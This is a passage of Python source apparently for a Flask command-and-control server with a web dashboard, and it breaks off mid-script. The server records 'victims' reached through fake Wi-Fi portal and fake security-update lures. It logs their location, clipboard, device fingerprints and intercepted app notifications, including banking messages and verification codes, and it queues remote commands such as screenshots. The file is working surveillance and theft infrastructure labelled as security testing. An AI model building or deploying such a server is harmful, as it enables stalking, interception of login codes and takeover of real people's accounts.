
"""
Advanced Mobile Security C&C Server with Full Dashboard Features
Complete victim management, data analysis, and real-time monitoring
"""

from flask import Flask, request, jsonify, render_template_string, send_file
from flask_cors import CORS
import json
import sqlite3
import os
from datetime import datetime, timedelta
import base64
import time
import traceback
import io
import csv
from collections import defaultdict, Counter
import zipfile

app = Flask(__name__)
CORS(app)

# Railway configuration
PORT = int(os.environ.get('PORT', 5000))
DATABASE = 'c2_data.db'

def init_db():
    """Initialize SQLite database with enhanced schema"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Drop existing tables to recreate with new schema
        cursor.execute('DROP TABLE IF EXISTS collected_data')
        cursor.execute('DROP TABLE IF EXISTS victims')
        cursor.execute('DROP TABLE IF EXISTS commands')
        cursor.execute('DROP TABLE IF EXISTS sessions')
        
        # Enhanced victims table
        cursor.execute('''
            CREATE TABLE victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                session_id TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                user_agent TEXT,
                ip_address TEXT,
                attack_type TEXT,
                status TEXT DEFAULT 'active',
                location_lat REAL,
                location_lng REAL,
                device_info TEXT,
                permissions_granted TEXT,
                notes TEXT
            )
        ''')
        
        # Enhanced data collection table
        cursor.execute('''
            CREATE TABLE collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                data_type TEXT,
                data_content TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                source_url TEXT,
                severity TEXT DEFAULT 'medium',
                tags TEXT
            )
        ''')
        
        # Notifications table for intercepted notifications
        cursor.execute('''
            CREATE TABLE notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                platform TEXT,
                category TEXT,
                title TEXT,
                body TEXT,
                notification_data TEXT,
                analysis_data TEXT,
                risk_level TEXT DEFAULT 'low',
                sensitive_data TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                source TEXT DEFAULT 'interceptor'
            )
        ''')
        
        # Commands table for remote control
        cursor.execute('''
            CREATE TABLE commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                command_type TEXT,
                command_data TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP
            )
        ''')
        
        # Sessions table for tracking user sessions
        cursor.execute('''
            CREATE TABLE sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                session_start TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                session_end TIMESTAMP,
                duration INTEGER,
                page_views INTEGER DEFAULT 0,
                actions_performed INTEGER DEFAULT 0
            )
        ''')
        
        conn.commit()
        conn.close()
        log_activity("✅ Enhanced database initialized successfully")
        return True
        
    except Exception as e:
        log_activity(f"❌ Database initialization failed: {e}")
        return False

def log_activity(message, ip_address="server"):
    """Enhanced logging with severity levels"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] 📡 {message} | IP: {ip_address}")

def store_victim_data(victim_id, data_type, content, source_url, ip_address, user_agent, attack_type='unknown'):
    """Enhanced victim data storage with notification support"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Extract additional metadata from content
        session_id = ''
        location_lat, location_lng = None, None
        device_info = {}
        permissions_granted = []
        
        if isinstance(content, dict):
            session_id = content.get('session_id', '')
            
            # Extract location data
            if 'latitude' in content and 'longitude' in content:
                location_lat = content.get('latitude')
                location_lng = content.get('longitude')
            
            # Extract device fingerprint
            if data_type == 'device_fingerprint':
                device_info = {
                    'platform': content.get('platform', ''),
                    'screen': content.get('screenResolution', ''),
                    'timezone': content.get('timezone', ''),
                    'language': content.get('language', '')
                }
            
            # Track permissions
            if 'permission' in content:
                permissions_granted.append(content.get('permission'))
            
            # Handle notification interception
            if data_type == 'notification_intercepted':
                store_notification_data(victim_id, content)
        
        # Update or insert victim info with enhanced data
        cursor.execute('''
            INSERT OR REPLACE INTO victims 
            (victim_id, session_id, last_seen, user_agent, ip_address, attack_type, 
             location_lat, location_lng, device_info, permissions_granted)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (victim_id, session_id, datetime.now(), user_agent, ip_address, attack_type,
              location_lat, location_lng, json.dumps(device_info), json.dumps(permissions_granted)))
        
        # Determine severity based on data type
        severity = 'low'
        if data_type in ['location_data', 'clipboard_data', 'device_fingerprint', 'notification_intercepted']:
            severity = 'high'
        elif data_type in ['permission_granted', 'background_monitor']:
            severity = 'medium'
        
        # Store data point with enhanced metadata
        content_str = json.dumps(content) if isinstance(content, dict) else str(content)
        cursor.execute('''
            INSERT INTO collected_data 
            (victim_id, data_type, data_content, source_url, severity)
            VALUES (?, ?, ?, ?, ?)
        ''', (victim_id, data_type, content_str, source_url, severity))
        
        conn.commit()
        conn.close()
        
        log_activity(f"💾 Stored {data_type} ({severity}) for victim {victim_id[:12]}...", ip_address)
        return True
        
    except Exception as e:
        log_activity(f"❌ Database error in store_victim_data: {e}", ip_address)
        traceback.print_exc()
        return False

def store_notification_data(victim_id, notification_content):
    """Store intercepted notification data in dedicated table"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Extract notification details
        notification = notification_content.get('notification', {})
        analysis = notification_content.get('analysis', {})
        
        platform = analysis.get('platform', 'unknown')
        category = analysis.get('category', 'unknown')
        title = notification.get('title', '')
        body = notification.get('body', '')
        risk_level = analysis.get('riskLevel', 'low')
        sensitive_data = json.dumps(analysis.get('sensitiveData', []))
        
        cursor.execute('''
            INSERT INTO notifications 
            (victim_id, platform, category, title, body, notification_data, 
             analysis_data, risk_level, sensitive_data)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (victim_id, platform, category, title, body, 
              json.dumps(notification), json.dumps(analysis), risk_level, sensitive_data))
        
        conn.commit()
        conn.close()
        
        log_activity(f"📱 Stored notification from {platform} for victim {victim_id[:12]}...")
        return True
        
    except Exception as e:
        log_activity(f"❌ Error storing notification: {e}")
        return False

@app.route('/')
def dashboard():
    """Advanced C&C dashboard with full features"""
    dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎯 Advanced Mobile Security C&C Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Consolas', 'Monaco', monospace; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41; 
            min-height: 100vh;
        }
        
        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            width: 250px;
            height: 100vh;
            background: rgba(0, 0, 0, 0.9);
            border-right: 2px solid #00ff41;
            padding: 20px;
            overflow-y: auto;
        }
        
        .main-content {
            margin-left: 250px;
            padding: 20px;
        }
        
        .header { 
            text-align: center; 
            margin-bottom: 30px; 
            padding: 30px;
            background: rgba(0, 255, 65, 0.1);
            border: 2px solid #00ff41;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
        }
        
        .header h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff41;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 5px #00ff41; }
            to { text-shadow: 0 0 20px #00ff41, 0 0 30px #00ff41; }
        }
        
        .nav-item {
            display: block;
            color: #00ff41;
            text-decoration: none;
            padding: 12px;
            margin: 5px 0;
            border-radius: 5px;
            transition: all 0.3s;
            border: 1px solid transparent;
        }
        
        .nav-item:hover, .nav-item.active {
            background: rgba(0, 255, 65, 0.2);
            border: 1px solid #00ff41;
            transform: translateX(5px);
        }
        
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px; 
        }
        
        .stat-box { 
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41;
            padding: 25px; 
            text-align: center;
            border-radius: 15px;
            transition: all 0.3s ease;
        }
        
        .stat-box:hover {
            box-shadow: 0 0 25px rgba(0, 255, 65, 0.5);
            transform: translateY(-5px);
        }
        
        .stat-number { 
            font-size: 2.5rem; 
            color: #ff6b6b;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #ff6b6b;
        }
        
        .stat-label {
            color: #cccccc;
            font-size: 1.1rem;
        }
        
        .content-section {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41;
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
            display: none;
        }
        
        .content-section.active {
            display: block;
        }
        
        .victims-table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 20px; 
        }
        
        .victims-table th, .victims-table td { 
            border: 1px solid #00ff41; 
            padding: 12px; 
            text-align: left; 
            word-break: break-word;
        }
        
        .victims-table th { 
            background: rgba(0, 255, 65, 0.2);
            font-weight: bold;
        }
        
        .victims-table tr:nth-child(even) {
            background: rgba(0, 255, 65, 0.05);
        }
        
        .status-online { color: #00ff41; font-weight: bold; }
        .status-offline { color: #ff6b6b; }
        .status-away { color: #ffaa00; }
        
        .severity-high { color: #ff6b6b; font-weight: bold; }
        .severity-medium { color: #ffaa00; }
        .severity-low { color: #888; }
        
        button { 
            background: linear-gradient(45deg, #00ff41, #40ff80);
            color: #000; 
            border: none; 
            padding: 8px 15px; 
            cursor: pointer; 
            margin: 2px;
            border-radius: 20px;
            font-weight: bold;
            transition: all 0.3s ease;
            font-size: 12px;
        }
        
        button:hover {
            background: linear-gradient(45deg, #40ff80, #80ff80);
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
        }
        
        .btn-danger {
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
        }
        
        .btn-danger:hover {
            background: linear-gradient(45deg, #ff8e8e, #ffaaaa);
        }
        
        .search-filter {
            background: #333;
            color: #00ff41;
            border: 1px solid #00ff41;
            padding: 8px;
            border-radius: 5px;
            margin: 10px 5px;
        }
        
        .filter-controls {
            margin: 20px 0;
            padding: 15px;
            background: rgba(0, 255, 65, 0.1);
            border-radius: 10px;
        }
        
        .map-container {
            height: 400px;
            background: #222;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #888;
        }
        
        .data-chart {
            height: 300px;
            background: #222;
            border-radius: 10px;
            margin: 20px 0;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
        }
        
        .modal-content {
            background: #1a1a2e;
            margin: 5% auto;
            padding: 20px;
            border: 2px solid #00ff41;
            border-radius: 15px;
            width: 80%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .close {
            color: #ff6b6b;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .close:hover {
            color: #fff;
        }
        
        .json-display {
            background: #000;
            color: #00ff41;
            padding: 15px;
            border-radius: 5px;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .timeline {
            border-left: 2px solid #00ff41;
            padding-left: 20px;
            margin: 20px 0;
        }
        
        .timeline-item {
            background: rgba(0, 255, 65, 0.1);
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border-left: 4px solid #00ff41;
        }
        
        .export-section {
            margin: 20px 0;
            padding: 15px;
            background: rgba(0, 255, 65, 0.05);
            border-radius: 10px;
        }
        
        @media (max-width: 768px) {
            .sidebar { 
                transform: translateX(-100%);
                transition: transform 0.3s;
            }
            .sidebar.open { 
                transform: translateX(0);
            }
            .main-content { 
                margin-left: 0;
            }
            .header h1 { font-size: 1.8rem; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .victims-table { font-size: 0.9rem; }
        }
    </style>
</head>
<body>
    <!-- Sidebar Navigation -->
    <div class="sidebar">
        <h3 style="color: #00ff41; margin-bottom: 20px;">🎯 C&C Control</h3>
        <a href="#" class="nav-item active" onclick="showSection('overview')">📊 Overview</a>
        <a href="#" class="nav-item" onclick="showSection('victims')">👥 Victims</a>
        <a href="#" class="nav-item" onclick="showSection('data')">📋 Data Analysis</a>
        <a href="#" class="nav-item" onclick="showSection('map')">🗺️ Geolocation</a>
        <a href="#" class="nav-item" onclick="showSection('timeline')">⏰ Timeline</a>
        <a href="#" class="nav-item" onclick="showSection('commands')">⚡ Commands</a>
        <a href="#" class="nav-item" onclick="showSection('notifications')">📱 Notifications</a>
        <a href="#" class="nav-item" onclick="showSection('export')">💾 Export Data</a>
        <a href="#" class="nav-item" onclick="showSection('settings')">⚙️ Settings</a>
        
        <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #00ff41;">
            <button onclick="refreshAllData()" style="width: 100%; margin: 5px 0;">🔄 Refresh All</button>
            <button onclick="clearAllData()" class="btn-danger" style="width: 100%; margin: 5px 0;">🗑️ Clear Data</button>
        </div>
        
        <div style="margin-top: 20px; font-size: 0.8rem; color: #888;">
            <div>📡 Server: Online</div>
            <div>⏱️ Uptime: <span id="uptime">0h 0m</span></div>
            <div>🔄 Auto-refresh: <span id="auto-refresh-status">ON</span></div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <!-- Overview Section -->
        <div id="overview-section" class="content-section active">
            <div class="header">
                <h1>🎯 Advanced Command & Control Dashboard</h1>
                <p>🌍 Mobile Security Testing C&C Server - Full Features</p>
                <p style="margin-top: 10px; color: #ffaa00;">⚡ Powered by Railway - v2.0 Enhanced</p>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number" id="total-victims">0</div>
                    <div class="stat-label">Total Victims</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="online-victims">0</div>
                    <div class="stat-label">Online Now</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="total-data">0</div>
                    <div class="stat-label">Data Points</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="high-severity">0</div>
                    <div class="stat-label">High Severity</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="attack-types">0</div>
                    <div class="stat-label">Attack Types</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="server-uptime">0h</div>
                    <div class="stat-label">Server Uptime</div>
                </div>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                <div class="data-chart" id="attack-chart">
                    <canvas id="attackTypesChart" width="400" height="300"></canvas>
                </div>
                <div class="data-chart" id="severity-chart">
                    <canvas id="severityChart" width="400" height="300"></canvas>
                </div>
            </div>
        </div>

        <!-- Victims Section -->
        <div id="victims-section" class="content-section">
            <h2>👥 Victim Management</h2>
            
            <div class="filter-controls">
                <input type="text" class="search-filter" id="victim-search" placeholder="🔍 Search victims..." onkeyup="filterVictims()">
                <select class="search-filter" id="status-filter" onchange="filterVictims()">
                    <option value="">All Status</option>
                    <option value="online">Online</option>
                    <option value="away">Away</option>
                    <option value="offline">Offline</option>
                </select>
                <select class="search-filter" id="attack-filter" onchange="filterVictims()">
                    <option value="">All Attack Types</option>
                    <option value="wifi_portal">WiFi Portal</option>
                    <option value="security_update">Security Update</option>
                    <option value="manual_test">Manual Test</option>
                </select>
                <button onclick="exportVictims()">📥 Export CSV</button>
            </div>
            
            <table class="victims-table">
                <thead>
                    <tr>
                        <th>🆔 Victim ID</th>
                        <th>🎭 Attack Type</th>
                        <th>🌐 IP Address</th>
                        <th>⚡ Status</th>
                        <th>📱 Device</th>
                        <th>📍 Location</th>
                        <th>🛠️ Actions</th>
                    </tr>
                </thead>
                <tbody id="victims-tbody">
                    <tr><td colspan="7" style="text-align: center; color: #666; padding: 40px;">
                        🔄 Loading victim data...
                    </td></tr>
                </tbody>
            </table>
        </div>

        <!-- Data Analysis Section -->
        <div id="data-section" class="content-section">
            <h2>📋 Data Analysis</h2>
            
            <div class="filter-controls">
                <input type="text" class="search-filter" id="data-search" placeholder="🔍 Search data..." onkeyup="filterData()">
                <select class="search-filter" id="data-type-filter" onchange="filterData()">
                    <option value="">All Data Types</option>
                    <option value="device_fingerprint">Device Fingerprint</option>
                    <option value="location_data">Location Data</option>
                    <option value="clipboard_data">Clipboard Data</option>
                    <option value="permission_granted">Permissions</option>
                </select>
                <select class="search-filter" id="severity-filter" onchange="filterData()">
                    <option value="">All Severity</option>
                    <option value="high">High</option>
                    <option value="medium">Medium</option>
                    <option value="low">Low</option>
                </select>
            </div>
            
            <div id="data-analysis-content">
                <div style="text-align: center; padding: 40px; color: #666;">
                    🔄 Loading data analysis...
                </div>
            </div>
        </div>

        <!-- Geolocation Section -->
        <div id="map-section" class="content-section">
            <h2>🗺️ Victim Geolocation</h2>
            <div class="map-container">
                <div style="text-align: center;">
                    <div style="font-size: 3rem; margin-bottom: 20px;">🗺️</div>
                    <div>Interactive Map - Location Data Visualization</div>
                    <div style="margin-top: 10px; font-size: 0.9rem;">Shows victim locations from captured GPS data</div>
                </div>
            </div>
            <div id="location-list" style="margin-top: 20px;">
                <!-- Location data will be populated here -->
            </div>
        </div>

        <!-- Timeline Section -->
        <div id="timeline-section" class="content-section">
            <h2>⏰ Attack Timeline</h2>
            <div class="filter-controls">
                <input type="date" class="search-filter" id="date-from">
                <input type="date" class="search-filter" id="date-to">
                <button onclick="filterTimeline()">🔍 Filter Timeline</button>
            </div>
            <div class="timeline" id="timeline-content">
                <div style="text-align: center; padding: 40px; color: #666;">
                    🔄 Loading timeline...
                </div>
            </div>
        </div>

        <!-- Commands Section -->
        <div id="commands-section" class="content-section">
            <h2>⚡ Remote Commands</h2>
            <div class="filter-controls">
                <select class="search-filter" id="command-victim">
                    <option value="">Select Victim</option>
                </select>
                <select class="search-filter" id="command-type">
                    <option value="get_location">📍 Get Location</option>
                    <option value="get_battery">🔋 Get Battery Status</option>
                    <option value="get_network">🌐 Get Network Info</option>
                    <option value="take_screenshot">📸 Take Screenshot</option>
                    <option value="get_clipboard">📋 Get Clipboard</option>
                </select>
                <button onclick="sendCommand()">📤 Send Command</button>
            </div>
            
            <h3>📋 Command History</h3>
            <div id="commands-history">
                <div style="text-align: center; padding: 40px; color: #666;">
                    No commands sent yet
                </div>
            </div>
        </div>

        <!-- Notifications Section -->
        <div id="notifications-section" class="content-section">
            <h2>📱 Notification Interceptor</h2>
            
            <div class="filter-controls">
                <select class="search-filter" id="notification-platform-filter" onchange="filterNotifications()">
                    <option value="">All Platforms</option>
                    <option value="whatsapp">WhatsApp</option>
                    <option value="telegram">Telegram</option>
                    <option value="facebook">Facebook</option>
                    <option value="instagram">Instagram</option>
                    <option value="gmail">Gmail</option>
                    <option value="banking">Banking</option>
                    <option value="unknown">Unknown</option>
                </select>
                <select class="search-filter" id="notification-category-filter" onchange="filterNotifications()">
                    <option value="">All Categories</option>
                    <option value="messaging">Messaging</option>
                    <option value="financial">Financial</option>
                    <option value="security">Security</option>
                    <option value="social">Social</option>
                    <option value="email">Email</option>
                </select>
                <select class="search-filter" id="notification-risk-filter" onchange="filterNotifications()">
                    <option value="">All Risk Levels</option>
                    <option value="high">High Risk</option>
                    <option value="medium">Medium Risk</option>
                    <option value="low">Low Risk</option>
                </select>
                <button onclick="exportNotifications()">📥 Export Notifications</button>
                <button onclick="testNotificationCapture()">🧪 Test Capture</button>
            </div>
            
            <!-- Notification Statistics -->
            <div class="stats" style="margin: 20px 0;">
                <div class="stat-box">
                    <div class="stat-number" id="total-notifications">0</div>
                    <div class="stat-label">Total Intercepted</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="whatsapp-notifications">0</div>
                    <div class="stat-label">WhatsApp</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="sensitive-notifications">0</div>
                    <div class="stat-label">Sensitive Data</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="verification-codes">0</div>
                    <div class="stat-label">Verification Codes</div>
                </div>
            </div>
            
            <!-- Live Notification Feed -->
            <div style="background: rgba(0, 0, 0, 0.8); border: 2px solid #00ff41; border-radius: 15px; padding: 20px; margin: 20px 0;">
                <h3>🔴 Live Notification Feed</h3>
                <div id="live-notification-feed" style="max-height: 300px; overflow-y: auto; margin-top: 15px;">
                    <div style="text-align: center; padding: 40px; color: #666;">
                        📡 Waiting for notifications...
                    </div>
                </div>
            </div>
            
            <!-- Intercepted Notifications Table -->
            <div id="notifications-table-container">
                <h3>📋 Intercepted Notifications</h3>
                <table class="victims-table">
                    <thead>
                        <tr>
                            <th>⏰ Time</th>
                            <th>📱 Platform</th>
                            <th>📋 Category</th>
                            <th>📝 Content Preview</th>
                            <th>⚠️ Risk Level</th>
                            <th>🔍 Sensitive Data</th>
                            <th>🛠️ Actions</th>
                        </tr>
                    </thead>
                    <tbody id="notifications-tbody">
                        <tr><td colspan="7" style="text-align: center; color: #666; padding: 40px;">
                            📱 No notifications intercepted yet
                        </td></tr>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Export Section -->
        <div id="export-section" class="content-section">
            <h2>💾 Data Export & Reports</h2>
            
            <div class="export-section">
                <h3>📊 Export Options</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0;">
                    <button onclick="exportData('victims')">👥 Export Victims (CSV)</button>
                    <button onclick="exportData('data')">📋 Export All Data (JSON)</button>
                    <button onclick="exportData('timeline')">⏰ Export Timeline (CSV)</button>
                    <button onclick="generateReport()">📄 Generate Report (HTML)</button>
                </div>
            </div>
            
            <div class="export-section">
                <h3>📈 Analytics Reports</h3>
                <div id="analytics-summary">
                    <div style="text-align: center; padding: 40px; color: #666;">
                        🔄 Generating analytics...
                    </div>
                </div>
            </div>
        </div>

        <!-- Settings Section -->
        <div id="settings-section" class="content-section">
            <h2>⚙️ System Settings</h2>
            
            <div class="export-section">
                <h3>🔧 Dashboard Settings</h3>
                <label>
                    <input type="checkbox" id="auto-refresh" checked onchange="toggleAutoRefresh()">
                    Enable Auto-refresh (30s)
                </label><br><br>
                
                <label>
                    <input type="checkbox" id="sound-alerts" onchange="toggleSoundAlerts()">
                    Sound alerts for new victims
                </label><br><br>
                
                <label>
                    Refresh Interval: 
                    <select id="refresh-interval" onchange="updateRefreshInterval()">
                        <option value="10">10 seconds</option>
                        <option value="30" selected>30 seconds</option>
                        <option value="60">1 minute</option>
                        <option value="300">5 minutes</option>
                    </select>
                </label>
            </div>
            
            <div class="export-section">
                <h3>🗃️ Database Management</h3>
                <button onclick="backupDatabase()">💾 Backup Database</button>
                <button onclick="clearOldData()" class="btn-danger">🗑️ Clear Old Data (30+ days)</button>
                <button onclick="resetDatabase()" class="btn-danger">⚠️ Reset All Data</button>
            </div>
        </div>
    </div>

    <!-- Victim Detail Modal -->
    <div id="victimModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2 id="modal-title">🎯 Victim Details</h2>
            <div id="modal-content">
                <!-- Victim details will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        let currentData = {
            victims: [],
            dataPoints: [],
            commands: []
        };
        
        let autoRefreshEnabled = true;
        let refreshInterval = 30000;
        let refreshTimer;
        
        // Navigation
        function showSection(sectionName) {
            // Hide all sections
            document.querySelectorAll('.content-section').forEach(section => {
                section.classList.remove('active');
            });
            
            // Remove active from nav items
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
            });
            
            // Show selected section
            document.getElementById(sectionName + '-section').classList.add('active');
            
            // Add active to clicked nav item
            event.target.classList.add('active');
            
            // Load section-specific data
            loadSectionData(sectionName);
        }
        
        function loadSectionData(section) {
            switch(section) {
                case 'overview':
                    loadOverviewData();
                    break;
                case 'victims':
                    loadVictimsData();
                    break;
                case 'data':
                    loadDataAnalysis();
                    break;
                case 'map':
                    loadMapData();
                    break;
                case 'timeline':
                    loadTimelineData();
                    break;
                case 'commands':
                    loadCommandsData();
                    break;
                case 'notifications':
                    loadNotificationsData();
                    break;
                case 'export':
                    generateAnalytics();
                    break;
            }
        }
        
        // Data loading functions
        async function refreshAllData() {
            try {
                const response = await fetch('/api/dashboard-data');
                if (response.ok) {
                    currentData = await response.json();
                    updateAllDisplays();
                    console.log('📊 Dashboard data refreshed');
                } else {
                    console.error('Failed to refresh data');
                }
            } catch (error) {
                console.error('Error refreshing data:', error);
            }
        }
        
        function updateAllDisplays() {
            updateStats();
            updateVictimsTable();
            updateDataAnalysis();
            updateTimeline();
        }
        
        function updateStats() {
            const stats = currentData.stats || {};
            document.getElementById('total-victims').textContent = stats.total_victims || 0;
            document.getElementById('online-victims').textContent = stats.online_victims || 0;
            document.getElementById('total-data').textContent = stats.total_data || 0;
            document.getElementById('high-severity').textContent = stats.high_severity || 0;
            document.getElementById('attack-types').textContent = stats.attack_types || 0;
        }
        
        function loadOverviewData() {
            // Update charts and overview statistics
            updateStats();
            // TODO: Implement chart.js for attack types and severity charts
        }
        
        function loadVictimsData() {
            updateVictimsTable();
        }
        
        function updateVictimsTable() {
            const tbody = document.getElementById('victims-tbody');
            tbody.innerHTML = '';
            
            if (!currentData.victims || currentData.victims.length === 0) {
                tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: #666; padding: 40px;">📡 No victims found</td></tr>';
                return;
            }
            
            currentData.victims.forEach(victim => {
                const row = tbody.insertRow();
                const timeSince = Math.floor((Date.now() - new Date(victim.last_seen).getTime()) / 1000);
                
                let status = 'offline';
                let statusText = 'Offline';
                if (timeSince < 120) {
                    status = 'online';
                    statusText = 'Online';
                } else if (timeSince < 600) {
                    status = 'away';
                    statusText = 'Away';
                }
                
                const deviceType = getDeviceType(victim.user_agent || '');
                const shortId = victim.victim_id.substring(0, 20) + '...';
                const location = victim.location_lat ? `${victim.location_lat.toFixed(4)}, ${victim.location_lng.toFixed(4)}` : 'Unknown';
                
                row.innerHTML = `
                    <td title="${victim.victim_id}">${shortId}</td>
                    <td>${victim.attack_type || 'unknown'}</td>
                    <td>${victim.ip_address || 'unknown'}</td>
                    <td class="status-${status}">${statusText} (${formatTime(timeSince)})</td>
                    <td>${deviceType}</td>
                    <td>${location}</td>
                    <td>
                        <button onclick="viewVictim('${victim.victim_id}')" title="View Details">👁️ View</button>
                        <button onclick="sendCommandTo('${victim.victim_id}')" title="Send Command">⚡ Cmd</button>
                        <button onclick="trackVictim('${victim.victim_id}')" title="Track Location">📍 Track</button>
                        <button onclick="deleteVictim('${victim.victim_id}')" class="btn-danger" title="Delete">🗑️</button>
                    </td>
                `;
            });
        }
        
        function loadDataAnalysis() {
            const container = document.getElementById('data-analysis-content');
            
            if (!currentData.dataPoints || currentData.dataPoints.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">📋 No data points found</div>';
                return;
            }
            
            let html = '<table class="victims-table"><thead><tr>';
            html += '<th>⏰ Timestamp</th><th>🆔 Victim ID</th><th>📋 Data Type</th>';
            html += '<th>⚠️ Severity</th><th>📍 Source</th><th>🛠️ Actions</th></tr></thead><tbody>';
            
            currentData.dataPoints.forEach(data => {
                const shortVictimId = data.victim_id.substring(0, 15) + '...';
                const timestamp = new Date(data.timestamp).toLocaleString();
                
                html += `<tr>
                    <td>${timestamp}</td>
                    <td title="${data.victim_id}">${shortVictimId}</td>
                    <td>${data.data_type}</td>
                    <td class="severity-${data.severity}">${data.severity.toUpperCase()}</td>
                    <td>${data.source_url}</td>
                    <td>
                        <button onclick="viewDataDetail(${data.id})" title="View Content">👁️ View</button>
                        <button onclick="exportDataPoint(${data.id})" title="Export">💾 Export</button>
                    </td>
                </tr>`;
            });
            
            html += '</tbody></table>';
            container.innerHTML = html;
        }
        
        function loadMapData() {
            const container = document.getElementById('location-list');
            const victims = currentData.victims.filter(v => v.location_lat && v.location_lng);
            
            if (victims.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">📍 No location data available</div>';
                return;
            }
            
            let html = '<h3>📍 Victim Locations</h3>';
            victims.forEach(victim => {
                html += `<div class="timeline-item">
                    <strong>🎯 ${victim.victim_id.substring(0, 20)}...</strong><br>
                    📍 Coordinates: ${victim.location_lat.toFixed(6)}, ${victim.location_lng.toFixed(6)}<br>
                    🕒 Last Seen: ${new Date(victim.last_seen).toLocaleString()}<br>
                    <button onclick="openMaps(${victim.location_lat}, ${victim.location_lng})">🗺️ Open in Maps</button>
                </div>`;
            });
            
            container.innerHTML = html;
        }
        
        function loadTimelineData() {
            const container = document.getElementById('timeline-content');
            
            if (!currentData.dataPoints || currentData.dataPoints.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">⏰ No timeline data available</div>';
                return;
            }
            
            // Sort by timestamp
            const sortedData = [...currentData.dataPoints].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            let html = '';
            sortedData.forEach(data => {
                const timestamp = new Date(data.timestamp).toLocaleString();
                const icon = getDataTypeIcon(data.data_type);
                
                html += `<div class="timeline-item">
                    <div style="display: flex; justify-content: space-between;">
                        <span><strong>${icon} ${data.data_type}</strong></span>
                        <span class="severity-${data.severity}">${data.severity.toUpperCase()}</span>
                    </div>
                    <div>🆔 Victim: ${data.victim_id.substring(0, 20)}...</div>
                    <div>🕒 ${timestamp}</div>
                    <div>📍 Source: ${data.source_url}</div>
                </div>`;
            });
            
            container.innerHTML = html;
        }
        
        function loadCommandsData() {
            // Populate victim dropdown
            const select = document.getElementById('command-victim');
            select.innerHTML = '<option value="">Select Victim</option>';
            
            currentData.victims.forEach(victim => {
                const option = document.createElement('option');
                option.value = victim.victim_id;
